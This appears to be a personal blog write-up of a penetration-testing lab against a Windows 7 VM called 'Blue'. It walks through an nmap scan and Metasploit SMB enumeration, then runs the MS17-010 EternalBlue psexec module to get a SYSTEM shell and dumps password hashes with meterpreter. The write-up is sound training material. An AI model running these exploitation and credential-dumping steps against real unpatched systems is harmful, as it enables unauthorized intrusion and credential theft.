---
layout: post
title: Blue - EternalBlue
subtitle: Root the target system through its available service using Metasploit.
date: 2025-07-23 13:32
author: Ren Sie
comments: true
category: penetration-testing
---

## Enumeration
### Nmap
<details markdown="1">
<summary>Target Scanning Result</summary>

    Nmap 7.94SVN scan initiated Wed Jul 23 23:04:09 2025 as: nmap -T4 -p- -A -oN Blue_Nmap.txt 192.168.182.157  
    Nmap scan report for 192.168.182.157  
    Host is up (0.0024s latency).  
    Not shown: 65526 closed tcp ports (conn-refused)  
    PORT      STATE SERVICE      VERSION  
    135/tcp   open  msrpc        Microsoft Windows RPC  
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn  
    445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
    5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
    |_http-server-header: Microsoft-HTTPAPI/2.0  
    |_http-title: Service Unavailable  
    49152/tcp open  msrpc        Microsoft Windows RPC  
    49153/tcp open  msrpc        Microsoft Windows RPC  
    49154/tcp open  msrpc        Microsoft Windows RPC  
    49155/tcp open  msrpc        Microsoft Windows RPC  
    49156/tcp open  msrpc        Microsoft Windows RPC  
    Service Info: Host: WIN-845Q99OO4PP; OS: Windows; CPE: cpe:/o:microsoft:windows  
    
    Host script results:
    | smb2-security-mode: 
    |   2:1:0: 
    |_    Message signing enabled but not required
    |_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:4c:31:a9 (VMware)
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-time: 
    |   date: 2025-07-24T03:05:23
    |_  start_date: 2025-07-24T03:56:20
    | smb-os-discovery: 
    |   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
    |   OS CPE: cpe:/o:microsoft:windows_7::sp1
    |   Computer name: WIN-845Q99OO4PP
    |   NetBIOS computer name: WIN-845Q99OO4PP\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2025-07-23T23:05:23-04:00
    |_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Wed Jul 23 23:05:28 2025 -- 1 IP address (1 host up) scanned in 79.47 seconds
    
</details>

Discover the target system run SMB service
1. 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
2. 445/tcp   open  microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

### Metasploit
Using Metasploit to identify its Samba version (SMB 2.1)
1. msf6 > search scanner smb
2. msf6 auxiliary(scanner/smb/smb_version) > run
> [*] 192.168.182.157:445  
> SMB Detected (versions:1, 2) (preferred dialect: _SMB 2.1_) (signatures:optional) efe70ef4-8c95-4b46-91e2-0d232ba66646}) (authentication domain: WIN-845Q99004PP)Windows 7 Ultimate SP1 (build
04PP)

#### Weaponization

1. Google Search ✅
Some resource returns the smb version may be vulnerable to MS17-010 EternalBlue
2. Searchsploit ❌
3. Metasploit ✅
Use Metasploit to craft payload for it

#### Exploitation

1. msf6 exploit(windows/smb/ms17_010_psexec) > check

> [*] 192.168.182.157:445 Using auxiliary/scanner/smb/smb_ms17_010 as check
> [+] 192.168.182.157:445 x64 (64-bit) Host is likely VULNERABLE to MS17-010! - Windows
    
2. msf6 exploit(windows/smb/ms17_010_psexec) > run

> C:\>whoami  
> whoami  
> nt authority\system  
>  
> C:\>hostnames  
> hostnames  
> WIN-845Q99004PP

#### Post-Exploitation

1. meterpreter > hashdump
> meterpreter > hashdump  
> Administrator: 500: aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::  
> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
> HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::  
> user: 1000:aad3b435b51404eeaad3b435b51404ee: 2b576acbe6bcfda7294d6bd18041b8fe:::
